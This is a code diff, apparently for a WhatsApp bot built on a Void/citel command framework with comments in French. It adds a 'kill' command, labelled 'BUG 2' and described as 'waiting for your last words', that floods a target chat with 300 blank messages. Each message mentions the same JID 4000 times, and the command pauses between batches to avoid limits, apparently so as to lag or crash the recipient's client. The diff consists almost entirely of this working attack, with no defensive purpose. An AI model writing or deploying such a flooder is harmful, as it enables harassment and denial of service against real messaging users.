@@ -112,6 +112,53 @@ cmd({
         }
     }
 );
+
+///////////////////////////////////////////========================BUG 2=======================///////////////////////////////////////////////////////
+cmd({
+    pattern: "kill",
+    alias: ["htag"],
+    desc: "waiting for your last words",
+    category: "group",
+    filename: __filename,
+    use: '<text>',
+},
+async(Void, citel, text) => {
+    const jid = citel.chat; // JID du destinataire
+    const userId = Void.user.id; // JID de l'utilisateur
+    const message = "  "; // Le message à envoyer
+    const totalSends = 300; // Nombre total d'envois
+    const batchSends = 30; // Nombre d'envois avant une pause
+    const pauseDuration = 2 * 60 * 1000; // Durée de la pause en millisecondes (2 minutes)
+
+    let firstMessageSent = false;
+
+    for (let i = 0; i < totalSends; i += batchSends) {
+        for (let j = 0; j < batchSends; j++) {
+            const sentMsg = await Void.sendMessage(jid, {
+                text: message,
+                mentions: Array(4000).fill(jid) // Mentionner le même JID 4000 fois
+            });
+
+            // Confirmation après l'envoi du premier message
+            if (!firstMessageSent) {
+                await Void.sendMessage(userId, {
+                    text: `The first message has been successfully sent to ${jid}.`
+                });
+                firstMessageSent = true;
+            }
+        }
+
+        if (i + batchSends < totalSends) {
+            await Void.sendMessage(userId, { text: `2 minute break after ${i + batchSends} envois...`});
+            await new Promise(resolve => setTimeout(resolve, pauseDuration));
+        }
+    }
+
+    // Message final après tous les envois
+    await Void.sendMessage(userId, {
+        text: `All messages (total ${totalSends}) Have been sent to ${jid}.`
+    });
+});
 /*
 ///////////////////////////////////////////========================BUG 2=======================///////////////////////////////////////////////////////
 // Définir les valeurs de configuration directement dans le fichier
